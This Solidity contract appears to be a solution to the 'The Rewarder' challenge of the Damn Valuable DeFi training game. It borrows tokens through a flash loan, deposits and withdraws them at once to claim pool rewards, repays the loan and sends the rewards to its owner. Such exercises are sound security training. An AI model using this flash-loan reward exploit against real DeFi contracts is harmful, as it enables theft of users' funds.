// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "../DamnValuableToken.sol";
import "./TheRewarderPool.sol";
import "./FlashLoanerPool.sol";
import "./RewardToken.sol";

contract RewarderAttacker {
    address owner;
    DamnValuableToken public immutable liquidityToken;
    TheRewarderPool public immutable rewardPool;
    FlashLoanerPool public immutable loanPool;
    RewardToken public immutable rewardToken;

    constructor(
        address _liquidityToken,
        address _rewardPool,
        address _loanPool,
        address _accToken
    ) {
        owner = msg.sender;
        liquidityToken = DamnValuableToken(_liquidityToken);
        rewardPool = TheRewarderPool(_rewardPool);
        loanPool = FlashLoanerPool(_loanPool);
        rewardToken = RewardToken(_accToken);
    }

    function attack(uint256 amount) external {
        loanPool.flashLoan(amount);
        rewardToken.transfer(owner, rewardToken.balanceOf(address(this)));
    }

    function receiveFlashLoan(uint256 amount) external {
        liquidityToken.approve(address(rewardPool), amount);
        rewardPool.deposit(amount);
        rewardPool.withdraw(amount);
        liquidityToken.transfer(address(loanPool), amount);
    }
}
